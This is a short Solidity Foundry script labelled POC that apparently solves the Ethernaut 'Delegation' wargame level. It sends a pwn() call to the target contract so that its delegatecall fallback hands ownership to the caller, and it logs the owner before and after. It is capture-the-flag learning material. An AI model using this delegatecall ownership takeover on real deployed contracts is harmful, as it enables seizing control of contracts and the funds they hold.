//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel06.sol";

contract POC is Script {
    Delegation level6 = Delegation(0xA9403a0bF1c6797133fB31545d04Dd86DE3d95dc);

    function run() external {
        vm.startBroadcast();

        console.log("Current owner: ", level6.owner()); //check current owner
        (bool success, ) = address(level6).call(
            abi.encodeWithSignature("pwn()")
        ); //trigger callback with my msg.data
        console.log("Check delegatecall result: ", success);
        console.log("New owner is: ", level6.owner());

        vm.stopBroadcast();
    }
}
